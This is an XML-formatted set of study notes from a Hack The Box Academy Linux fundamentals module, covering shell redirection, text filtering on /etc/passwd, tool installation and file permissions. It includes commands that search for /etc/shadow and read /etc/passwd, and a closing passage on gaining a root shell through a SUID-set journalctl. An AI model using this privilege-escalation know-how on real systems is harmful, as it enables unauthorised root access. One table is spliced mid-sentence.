      <text:p text:style-name="P4"><text:span text:style-name="T10">$</text:span> find /etc/ -name shadow 2&gt; stderr.txt 1&gt; stdout.txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9"><text:soft-page-break/>Redirect STDIN</text:p>
      <text:p text:style-name="P4">As we have already seen, in combination with the file descriptors, we can redirect errors and output with greater-than character (&gt;). This also works with the lower-than sign (&lt;). However, the lower-than sign serves as standard input (FD 0 - STDIN). These characters can be seen as "direction" in the form of an arrow that tells us "from where" and "where to" the data should be redirected. We use the cat command to use the contents of the file "stdout.txt" as STDIN.</text:p>
      <text:p text:style-name="P4">$ cat &lt; stdout.txt</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P9">Redirect STDOUT and Append to a File</text:p>
      <text:p text:style-name="P4">When we use the greater-than sign (&gt;) to redirect our STDOUT, a new file is automatically created if it does not already exist. If this file exists, it will be overwritten without asking for confirmation. If we want to append STDOUT to our existing file, we can use the double greater-than sign (&gt;&gt;).</text:p>
      <text:p text:style-name="P4">$ find /etc/ -name passwd &gt;&gt; stdout.txt 2&gt;/dev/null</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Redirect STDIN Stream to a File</text:p>
      <text:p text:style-name="P4">We can also use the double lower-than characters (&lt;&lt;) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end. In the next example, we will use the cat command to read our streaming input through the stream and direct it to a file called "stream.txt."</text:p>
      <text:p text:style-name="P4">$ cat &lt;&lt; EOF &gt; stream.txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P30">Pipes</text:p>
      <text:p text:style-name="P4">Another way to redirect STDOUT is to use pipes (|). These are useful when we want to use the STDOUT from one program to be processed by another. One of the most commonly used tools is grep, which we will use in the next example. Grep is used to filter STDOUT according to the pattern we define. In the next example, we use the find command to search for all files in the "/etc/" directory with a ".conf" extension. Any errors are redirected to the "null device" (/dev/null). Using grep, we filter out the results and specify that only the lines containing the pattern "systemd" should be displayed.</text:p>
      <text:p text:style-name="P4">$ find /etc/ -name *.conf 2&gt;/dev/null | grep systemd</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">The redirections work, not only once. We can use the obtained results to redirect them to another program. For the next example<text:span text:style-name="T5">, we will use the tool called wc, which should count the total number of obtained results.</text:span></text:p>
      <text:p text:style-name="P4">$ find /etc/ -name *.conf 2&gt;/dev/null | grep systemd | wc -l</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15">List <text:s/>all installed packages:</text:p>
      <text:p text:style-name="P6">dpkg-query -l | grep "^ii" | wc -l </text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P16">List all .log files (go in lowest subdirectory / root)</text:p>
      <text:p text:style-name="P7">find -name *.log 2&gt;/dev/null | wc -l</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8"><text:a xlink:type="simple" xlink:href="https://academy.hackthebox.com/module/18/section/79" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://academy.hackthebox.com/module/18/section/79</text:a></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31"><text:span text:style-name="T11">&lt;&lt;&lt; END </text:span>File Descriptors and Redirections &gt;&gt;&gt;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3">Locate</text:p>
      <text:p text:style-name="Standard">It will take much time to search through the whole system for our files and directories to perform many different searches. The command locate offers us a quicker way to search through the system. In contrast to the find command, locate works with a local database that contains all information about existing files and folders. We can update this database with the following command.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">sudo updatedb</text:p>
      <text:p text:style-name="Standard">If we now search for all files with the ".conf" extension, you will find that this search produces results much faster than using find.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">locate *.conf</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">However, this tool does not have as many filter options that we can use. So it is always worth considering whether we can use the locate command or instead use the find command. It always depends on what we are looking for</text:p>
      <text:p text:style-name="P51"><text:soft-page-break/><text:span text:style-name="T14">&lt;&lt;&lt; </text:span><text:span text:style-name="T15">Install Tools</text:span><text:span text:style-name="T13"> &gt;&gt;&gt;</text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">If there are only a few packages that we want to install, we can enter them manually in the following command.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3">Installing Additional Tools</text:p>
      <text:p text:style-name="Standard">┌─[cry0l1t3@parrotos]─[~]</text:p>
      <text:p text:style-name="Standard">└──╼ $ sudo apt install netcat ncat nmap wireshark tcpdump ...SNIP... git vim tmux -y</text:p>
      <text:p text:style-name="Standard">[sudo] password for cry0l1t3: <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Reading package lists... Done</text:p>
      <text:p text:style-name="Standard">Building dependency tree</text:p>
      <text:p text:style-name="Standard">Reading state information... Done</text:p>
      <text:p text:style-name="Standard">The following packages were automatically installed and are no longer required: </text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>libarmadillo9 libboost-locale1.71.0 libcfitsio8 libdap25 libgdal27 libgfapi0</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>...SNIP...</text:p>
      <text:p text:style-name="Standard">However, if the list contains more than just five packages, we should always create a list and keep it updated. With the following command, we will install all the tools from the list at once using APT.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Installing Additional Tools from a List</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>Installing Additional Tools from a List</text:p>
      <text:p text:style-name="Standard">┌─[cry0l1t3@parrotos]─[~]</text:p>
      <text:p text:style-name="Standard">└──╼ $ sudo apt install $(cat tools.list | tr "\n" " ") -y</text:p>
      <text:p text:style-name="Standard">[sudo] password for cry0l1t3: <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Reading package lists... Done</text:p>
      <text:p text:style-name="Standard">Building dependency tree</text:p>
      <text:p text:style-name="Standard">Reading state information... Done</text:p>
      <text:p text:style-name="Standard">The following packages were automatically installed and are no longer required: </text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>libarmadillo9 libboost-locale1.71.0 libcfitsio8 libdap25 libgdal27 libgfapi0</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>...SNIP…</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P32"><text:span text:style-name="T11">&lt;&lt;&lt; END </text:span><text:span text:style-name="T12">Install Tools </text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P47"><text:span text:style-name="T11">&lt;&lt;&lt; </text:span><text:span text:style-name="T16">Filter Contents</text:span> &gt;&gt;&gt;</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P10">More</text:p>
      <text:p text:style-name="P23">$ more /etc/passwd</text:p>
      <text:p text:style-name="P22">After we read the content using cat and redirected it to more, the already mentioned pager opens, and we will automatically start at the beginning of the file.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">root:x:0:0:root:/root:/bin/bash</text:p>
      <text:p text:style-name="P22">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">bin:x:2:2:bin:/bin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sys:x:3:3:sys:/dev:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sync:x:4:65534:sync:/bin:/bin/sync</text:p>
      <text:p text:style-name="P22">&lt;SNIP&gt;</text:p>
      <text:p text:style-name="P22">--More--</text:p>
      <text:p text:style-name="P22">With the [Q] key, we can leave this pager. We will notice that the output remains in the terminal.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Less</text:p>
      <text:p text:style-name="P22"><text:soft-page-break/>If we now take a look at the tool less, we will notice on the man page that it contains many more features than more.</text:p>
      <text:p text:style-name="P22">$ less /etc/passwd</text:p>
      <text:p text:style-name="P23">The presentation is almost the same as with more. <text:s/></text:p>
      <text:p text:style-name="P22">root:x:0:0:root:/root:/bin/bash</text:p>
      <text:p text:style-name="P22">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">bin:x:2:2:bin:/bin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sys:x:3:3:sys:/dev:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sync:x:4:65534:sync:/bin:/bin/sync</text:p>
      <text:p text:style-name="P22">&lt;SNIP&gt;</text:p>
      <text:p text:style-name="P22">When closing less with the [Q] key, we will notice that the output we have seen, unlike more, does not remain in the terminal.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Head</text:p>
      <text:p text:style-name="P22">Sometimes we will only be interested in specific issues either at the beginning of the file or the end. If we only want to get the first lines of the file, we can use the tool head. By default, head prints the first ten lines of the given file or input, if not specified otherwise.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"><text:span text:style-name="T17">$</text:span>head /etc/passwd</text:p>
      <text:p text:style-name="P22">root:x:0:0:root:/root:/bin/bash</text:p>
      <text:p text:style-name="P22">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">bin:x:2:2:bin:/bin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sys:x:3:3:sys:/dev:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">sync:x:4:65534:sync:/bin:/bin/sync</text:p>
      <text:p text:style-name="P22">games:x:5:60:games:/usr/games:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Tail</text:p>
      <text:p text:style-name="P22">If we only want to see the last parts of a file or results, we can use the counterpart of head called tail, which returns the last ten lines.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ tail /etc/passwd</text:p>
      <text:p text:style-name="P22">miredo:x:115:65534::/var/run/miredo:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">rtkit:x:117:119:RealtimeKit,,,:/proc:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">nm-openvpn:x:118:120:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">nm-openconnect:x:119:121:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">pulse:x:120:122:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">beef-xss:x:121:124::/var/lib/beef-xss:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">lightdm:x:122:125:Light Display Manager:/var/lib/lightdm:/bin/false</text:p>
      <text:p text:style-name="P22">do-agent:x:998:998::/home/do-agent:/bin/false</text:p>
      <text:p text:style-name="P22">user6:x:1000:1000:,,,:/home/user6:/bin/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Sort</text:p>
      <text:p text:style-name="P22">Depending on which results and files are dealt with, they are rarely sorted. Often it is necessary to sort the desired results alphabetically or numerically to get a better overview. For this, we can use a tool called sort.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | sort</text:p>
      <text:p text:style-name="P22">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">bin:x:2:2:bin:/bin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">cry0l1t3:x:1001:1001::/home/cry0l1t3:/bin/bash</text:p>
      <text:p text:style-name="P22">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">dovecot:x:114:117:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">dovenull:x:115:118:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">games:x:5:60:games:/usr/games:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</text:p>
      <text:p text:style-name="P22">htb-student:x:1002:1002::/home/htb-student:/bin/bash</text:p>
      <text:p text:style-name="P22">&lt;SNIP&gt;</text:p>
      <text:p text:style-name="P22"><text:soft-page-break/>As we can see now, the output no longer starts with root but is now sorted alphabetically.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Grep</text:p>
      <text:p text:style-name="P22">More often, we will only search for specific results that contain patterns we have defined. One of the most used tools for this is grep, which offers many different features. Accordingly, we can search for users who have the default shell "/bin/bash" set as an example.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep "/bin/bash"</text:p>
      <text:p text:style-name="P22">root:x:0:0:root:/root:/bin/bash</text:p>
      <text:p text:style-name="P22">mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash</text:p>
      <text:p text:style-name="P22">cry0l1t3:x:1001:1001::/home/cry0l1t3:/bin/bash</text:p>
      <text:p text:style-name="P22">htb-student:x:1002:1002::/home/htb-student:/bin/bash</text:p>
      <text:p text:style-name="P22">Another possibility is to exclude specific results. For this, the option "-v" is used with grep. In the next example, we exclude all users who have disabled the standard shell with the name "/bin/false" or "/usr/bin/nologin".</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin"</text:p>
      <text:p text:style-name="P22">root:x:0:0:root:/root:/bin/bash</text:p>
      <text:p text:style-name="P22">sync:x:4:65534:sync:/bin:/bin/sync</text:p>
      <text:p text:style-name="P22">postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</text:p>
      <text:p text:style-name="P22">user6:x:1000:1000:,,,:/home/user6:/bin/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Cut</text:p>
      <text:p text:style-name="P22">Specific results with different characters may be separated as delimiters. Here it is handy to know how to remove specific delimiters and show the words on a line in a specified position. One of the tools that can be used for this is cut. Therefore we use the option "-d" and set the delimiter to the colon character (:) and define with the option "-f" the position in the line we want to output.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1</text:p>
      <text:p text:style-name="P22">root</text:p>
      <text:p text:style-name="P22">sync</text:p>
      <text:p text:style-name="P22">mrb3n</text:p>
      <text:p text:style-name="P22">cry0l1t3</text:p>
      <text:p text:style-name="P22">htb-student</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Tr</text:p>
      <text:p text:style-name="P22">Another possibility to replace certain characters from a line with characters defined by us is the tool tr. As the first option, we define which character we want to replace, and as a second option, we define the character we want to replace it with. In the next example, we replace the colon character with space.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "</text:p>
      <text:p text:style-name="P22">root x 0 0 root /root /bin/bash</text:p>
      <text:p text:style-name="P22">sync x 4 65534 sync /bin /bin/sync</text:p>
      <text:p text:style-name="P22">mrb3n x 1000 1000 mrb3n /home/mrb3n /bin/bash</text:p>
      <text:p text:style-name="P22">cry0l1t3 x 1001 1001 <text:s/>/home/cry0l1t3 /bin/bash</text:p>
      <text:p text:style-name="P22">htb-student x 1002 1002 <text:s/>/home/htb-student /bin/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Column</text:p>
      <text:p text:style-name="P22">Since such results can often have an unclear representation, the tool column is well suited to display such results in tabular form using the "-t."</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t</text:p>
      <text:p text:style-name="P22">root <text:s text:c="8"/>x <text:s/>0 <text:s text:c="4"/>0 <text:s text:c="5"/>root <text:s text:c="14"/>/root <text:s text:c="7"/>/bin/bash</text:p>
      <text:p text:style-name="P22">sync <text:s text:c="8"/>x <text:s/>4 <text:s text:c="4"/>65534 <text:s/>sync <text:s text:c="14"/>/bin <text:s text:c="8"/>/bin/sync</text:p>
      <text:p text:style-name="P22">mrb3n <text:s text:c="7"/>x <text:s/>1000 <text:s/>1000 <text:s text:c="2"/>mrb3n <text:s text:c="13"/>/home/mrb3n <text:s/>/bin/bash</text:p>
      <text:p text:style-name="P22">cry0l1t3 <text:s text:c="4"/>x <text:s/>1001 <text:s/>1001 <text:s text:c="2"/>/home/cry0l1t3 <text:s text:c="4"/>/bin/bash</text:p>
      <text:p text:style-name="P22">htb-student <text:s/>x <text:s/>1002 <text:s/>1002 <text:s text:c="2"/>/home/htb-student <text:s/>/bin/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Awk</text:p>
      <text:p text:style-name="P22">As we may have noticed, the user "postgres" has one row too many. To keep it as simple as possible to sort out such results, the (g)awk programming is beneficial, which allows us to display the first ($1) and last ($NF) result of the line.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"><text:s/>$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}'</text:p>
      <text:p text:style-name="P22">root /bin/bash</text:p>
      <text:p text:style-name="P22"><text:soft-page-break/>sync /bin/sync</text:p>
      <text:p text:style-name="P22">mrb3n /bin/bash</text:p>
      <text:p text:style-name="P22">cry0l1t3 /bin/bash</text:p>
      <text:p text:style-name="P22">htb-student /bin/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Sed</text:p>
      <text:p text:style-name="P22">There will come moments when we want to change specific names in the whole file or standard input. One of the tools we can use for this is the stream editor called sed. One of the most common uses of this is substituting text. Here, sed looks for patterns we have defined in the form of regular expressions (regex) and replaces them with another pattern that we have also defined. Let us stick to the last results and say we want to replace the word "bin" with "HTB."</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">The "s" flag at the beginning stands for the substitute command. Then we specify the pattern we want to replace. After the slash (/), we enter the pattern we want to use as a replacement in the third position. Finally, we use the "g" flag, which stands for replacing all matches.</text:p>
      <text:p text:style-name="P22"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}' | sed 's/bin/HTB/g'</text:p>
      <text:p text:style-name="P22">root /HTB/bash</text:p>
      <text:p text:style-name="P22">sync /HTB/sync</text:p>
      <text:p text:style-name="P22">mrb3n /HTB/bash</text:p>
      <text:p text:style-name="P22">cry0l1t3 /HTB/bash</text:p>
      <text:p text:style-name="P22">htb-student /HTB/bash</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P11">Wc</text:p>
      <text:p text:style-name="P22">Last but not least, it will often be useful to know how many successful matches we have. To avoid counting the lines or characters manually, we can use the tool wc. With the "-l" option, we specify that only the lines are counted.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}' | wc -l</text:p>
      <text:p text:style-name="P22">5</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P17">Get all services who are listening on target system on all interfaces (not localhots and only IPv4)</text:p>
      <text:p text:style-name="P22">ss -l -4 | grep -v "127\.0\.0" | grep "LISTEN" | wc -l</text:p>
      <text:p text:style-name="P22">Where:</text:p>
      <text:p text:style-name="P22">-l: show only listening services</text:p>
      <text:p text:style-name="P22">-4: show only ipv4</text:p>
      <text:p text:style-name="P22">-grep -v "127.0.0": exclude all localhost results</text:p>
      <text:p text:style-name="P22">-grep "LISTEN": better filtering only listening services</text:p>
      <text:p text:style-name="P22">wc -l: count results</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P12">Show all runjning processes with information (time, user, u...)</text:p>
      <text:p text:style-name="P25">ps aux</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P13">Filter all unique paths of that domain.</text:p>
      <text:p text:style-name="P26">curl “&lt;HOST&gt;” htb.txt &amp;&amp; cat htb.txt | tr " " "\n" | cut -d"'" -f2 | cut -d'"' -f2 | grep “&lt;HOST&gt;”| sort -u | wc -l</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P33"><text:span text:style-name="T11">&lt;&lt;&lt; END </text:span><text:span text:style-name="T16">Filter Contents</text:span> &gt;&gt;&gt;</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P46"><text:span text:style-name="T11">&lt;&lt;&lt; Permission Management </text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P44">Overview</text:p>
      <text:p text:style-name="P40">Under Linux, permissions are assigned to users and groups. Each user can be a member of different groups, and membership in these groups gives the user specific, additional permissions. Each file and directory belongs to a specific user and a specific group. So the permissions for users and groups that defined a file are also defined for the respective owners. When we create new files or directories, they belong to the group we belong to and us. The whole permission system on Linux systems is based on the octal number system, and basically, there are three different types of permissions a file or directory can be assigned:</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">(r) - Read</text:p>
      <text:p text:style-name="P40">(w) - Write</text:p>
      <text:p text:style-name="P40">(x) - Execute</text:p>
      <text:p text:style-name="P40">The permissions can be set for the owner, group, and others like presented in the next example with their corresponding permissions.</text:p>
      <text:p text:style-name="P40"><text:soft-page-break/></text:p>
      <text:p text:style-name="P40"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T18">$</text:span> ls -l /etc/passwd</text:p>
      <text:p text:style-name="P40">- rwx rw- r-- <text:s text:c="2"/>1 root root 1641 May <text:s/>4 23:42 /etc/passwd</text:p>
      <text:p text:style-name="P40">- --- --- --- <text:s text:c="2"/>| <text:s/>| <text:s text:c="3"/>| <text:s text:c="3"/>| <text:s text:c="2"/>|__________|</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>| <text:s text:c="3"/>| <text:s/>| <text:s text:c="3"/>| <text:s text:c="3"/>| <text:s text:c="7"/>|_ Date</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>| <text:s text:c="3"/>| <text:s/>| <text:s text:c="3"/>| <text:s text:c="3"/>|__________ File Size</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>| <text:s text:c="3"/>| <text:s/>| <text:s text:c="3"/>|_______________ Group</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>| <text:s text:c="3"/>| <text:s/>|____________________ User</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>| <text:s text:c="3"/>|_______________________ Number of hard links</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>| <text:s text:c="2"/>|_ Permission of others (read)</text:p>
      <text:p text:style-name="P40">| <text:s/>| <text:s text:c="2"/>|_____ Permissions of the group (read, write)</text:p>
      <text:p text:style-name="P40">| <text:s/>|_________ Permissions of the owner (read, write, execute)</text:p>
      <text:p text:style-name="P40">|____________ File type (- = File, d = Directory, l = Link, ... )</text:p>
      <text:p text:style-name="P40">Change Permissions</text:p>
      <text:p text:style-name="P40">We can modify permissions using the chmod command, permission group references (u - owner, g - Group, o - others, a - All users), and either a [+] or a [-] to add remove the designated permissions. In the following example, a user creates a new shell script owned by that user, not executable, and set with read/write permissions for all users.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">$ ls -l shell</text:p>
      <text:p text:style-name="P40">-rwxr-x--x <text:s text:c="2"/>1 cry0l1t3 htbteam 0 May <text:s/>4 22:12 shell</text:p>
      <text:p text:style-name="P40">We can then apply read permissions for all users and see the result.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">$ chmod a+r shell &amp;&amp; ls -l shell</text:p>
      <text:p text:style-name="P40">-rwxr-xr-x <text:s text:c="2"/>1 cry0l1t3 htbteam 0 May <text:s/>4 22:12 shell</text:p>
      <text:p text:style-name="P40">We can also set the permissions for all other users to read only using the octal value assignment.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">$ chmod 754 shell &amp;&amp; ls -l shell</text:p>
      <text:p text:style-name="P40">-rwxr-xr-- <text:s text:c="2"/>1 cry0l1t3 htbteam 0 May <text:s/>4 22:12 shell</text:p>
      <text:p text:style-name="P42">Let us look at all the representationCommand<text:tab/>Description</text:p>
      <text:p text:style-name="P42">whoami<text:tab/>Displays current username.</text:p>
      <text:p text:style-name="P42">id<text:tab/>Returns users identity</text:p>
      <text:p text:style-name="P42">hostname<text:tab/>Sets or prints the name of current host system.</text:p>
      <text:p text:style-name="P42">uname<text:tab/>Prints basic information about the operating system name and system hardware.</text:p>
      <text:p text:style-name="P42">pwd<text:tab/>Returns working directory name.</text:p>
      <text:p text:style-name="P42">ifconfig<text:tab/>The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters.</text:p>
      <text:p text:style-name="P42">ip<text:tab/>Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels.</text:p>
      <text:p text:style-name="P42">netstat<text:tab/>Shows network status.</text:p>
      <text:p text:style-name="P42">ss<text:tab/>Another utility to investigate sockets.</text:p>
      <text:p text:style-name="P42">ps<text:tab/>Shows process status.</text:p>
      <text:p text:style-name="P42">who<text:tab/>Displays who is logged in.</text:p>
      <text:p text:style-name="P42">env<text:tab/>Prints environment or sets and executes command.</text:p>
      <text:p text:style-name="P42">lsblk<text:tab/>Lists block devices.</text:p>
      <text:p text:style-name="P42">lsusb<text:tab/>Lists USB devices</text:p>
      <text:p text:style-name="P42">lsof<text:tab/>Lists opened files.</text:p>
      <text:p text:style-name="P42">lspci<text:tab/>Lists PCI devices.s associated with it to understand better how the permission assignment is calculated.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">Binary Notation: <text:s text:c="15"/>4 2 1 <text:s/>| <text:s/>4 2 1 <text:s/>| <text:s/>4 2 1</text:p>
      <text:p text:style-name="P40">----------------------------------------------------------</text:p>
      <text:p text:style-name="P40">Binary Representation: <text:s text:c="9"/>1 1 1 <text:s/>| <text:s/>1 0 1 <text:s/>| <text:s/>1 0 0</text:p>
      <text:p text:style-name="P40">----------------------------------------------------------</text:p>
      <text:p text:style-name="P40">Octal Value: <text:s text:c="21"/>7 <text:s text:c="3"/>| <text:s text:c="3"/>5 <text:s text:c="3"/>| <text:s text:c="3"/>4</text:p>
      <text:p text:style-name="P40">----------------------------------------------------------</text:p>
      <text:p text:style-name="P40">Permission Representation: <text:s text:c="5"/>r w x <text:s/>| <text:s/>r - x <text:s/>| <text:s/>r - -</text:p>
      <text:p text:style-name="P40">If we sum the set bits from the Binary Representation assigned to the values from Binary Notation together, we get the Octal Value. The Permission Representation represents the bits set in the Binary Representation by using the three characters, which only recognizes the set permissions easier.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P44">Change Owner</text:p>
      <text:p text:style-name="P40">To change the owner and/or the group assignments of a file or directory, we can use the chown command. The syntax is like following:</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"><text:soft-page-break/>Syntax - chown</text:p>
      <text:p text:style-name="P40">$ chown &lt;user&gt;:&lt;group&gt; &lt;file/directory&gt;</text:p>
      <text:p text:style-name="P40">In this example, "shell" can be replaced with any arbitrary file or folder.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">$ chown root:root shell &amp;&amp; ls -l shell</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">-rwxr-xr-- <text:s text:c="2"/>1 root root 0 May <text:s/>4 22:12 shell</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P44">SUID &amp; GUID</text:p>
      <text:p text:style-name="P40">Besides assigning direct user and group permissions, we can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (GUID) bits. These SUID/GUID bits allow, for example, users to run programs with the rights of another user. Administrators often use this to give their users special rights for certain applications or files. The letter "s" is used instead of an "x". When executing such a program, the SUID/GUID of the file owner is used.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">It is often the case that administrators are not familiar with the applications but still assign the SUID/GUID bits, which leads to a high-security risk. Such programs may contain functions that allow the execution of a shell from the pager, such as the application "journalctl."</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">If the administrator sets the SUID bit to "journalctl," any user with access to this application could execute a shell as root. More information about this and other such applications can be found at GTFObins.</text:p>
